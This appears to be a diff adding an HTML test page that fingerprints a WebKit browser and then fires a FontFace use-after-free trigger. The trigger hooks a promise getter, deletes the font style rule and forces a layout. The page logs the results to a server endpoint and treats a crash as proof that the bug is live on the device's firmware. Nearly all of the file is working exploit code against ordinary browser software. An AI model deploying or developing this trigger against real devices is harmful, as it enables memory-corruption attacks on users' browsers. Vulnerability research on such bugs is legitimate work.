@@ -1,0 +1,82 @@
+﻿<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>P1</title>
+<style>body{font-size:28px;font-family:sans-serif;background:#111;color:#0f0}pre{white-space:pre-wrap;font-size:22px}</style><style id="s0">@font-face { font-family: probeA; src: local(NonexistentFont); }</style>
+</head>
+<body>
+<h3 id="st">stage A</h3>
+<pre id="out"></pre>
+<script>
+// ---- Phase 1: cutoff fingerprint + FontFace UAF crash test (14.23) ----
+function log(s) {
+  document.getElementById('out').textContent += s + "\n";
+  try { fetch('/log?m=' + encodeURIComponent(s)); } catch (e) {}
+}
+
+// Stage A: WebKit feature markers (presence only; interpretation offline)
+var markers = {
+  'URL.canParse': typeof URL !== 'undefined' && typeof URL.canParse === 'function',
+  'Promise.try': typeof Promise !== 'undefined' && typeof Promise.try === 'function',
+  'Array.fromAsync': typeof Array !== 'undefined' && typeof Array.fromAsync === 'function',
+  'RegExp.escape': typeof RegExp !== 'undefined' && typeof RegExp.escape === 'function',
+  'setMethods': typeof Set !== 'undefined' && typeof Set.prototype.union === 'function',
+  'iteratorHelpers': typeof Iterator !== 'undefined' && typeof Iterator.from === 'function',
+  'float16': typeof Float16Array !== 'undefined',
+  'cssRegisterProperty': typeof CSS !== 'undefined' && typeof CSS.registerProperty === 'function',
+  'viewTransitions': typeof Document !== 'undefined' && 'startViewTransition' in Document.prototype,
+  'structuredClone': typeof structuredClone === 'function'
+};
+var keys = Object.keys(markers);
+for (var i = 0; i < keys.length; i++) log(keys[i] + ' = ' + markers[keys[i]]);
+log('UA = ' + navigator.userAgent);
+
+// Stage B: the FontFace UAF trigger (crash = vector LIVE on this firmware)
+// shape per WebKit regression test fontface-setstatus-crash.html +
+// 14.10 research: hook FontFace.prototype.then getter; document.fonts.load;
+// inside the getter delete the @font-face style rule + force recalc.
+function trigger() {
+  log('stage B: trigger in 3s');
+  document.getElementById('st').textContent = 'stage B armed';
+  setTimeout(function () {
+    log('triggering now - if the page dies, the bug is LIVE');
+    document.getElementById('st').textContent = 'TRIGGERED';
+
+    var f = new FontFace('probeA', 'local(NonexistentFont)', {});
+    document.fonts.add(f);
+
+    Object.defineProperty(FontFace.prototype, 'then', {
+      configurable: true,
+      get: function () {
+        // re-entrancy: free the CSSFontFace captured by matchingFaces...
+        var s = document.getElementById('s0');
+        if (s) s.remove();
+        try { document.fonts.delete(f); } catch (e) {}
+        document.body.offsetHeight;      // force style recalc / layout
+        return undefined;
+      }
+    });
+
+    try {
+      document.fonts.load('1em probeA', 'x').then(
+        function () { log('load resolved - NO crash (survived)'); },
+        function (e) { log('load rejected: ' + e); }
+      );
+    } catch (e) {
+      log('load threw: ' + e);
+    }
+    // if the WebProcess crashes, none of the above will report -
+    // the console will show the page dying. That IS the result.
+    setTimeout(function () {
+      log('survived 5s after trigger - likely PATCHED (or reclaim failed)');
+    }, 5000);
+  }, 3000);
+}
+
+log('stage A done');
+trigger();
+</script>
+</body>
+</html>
+
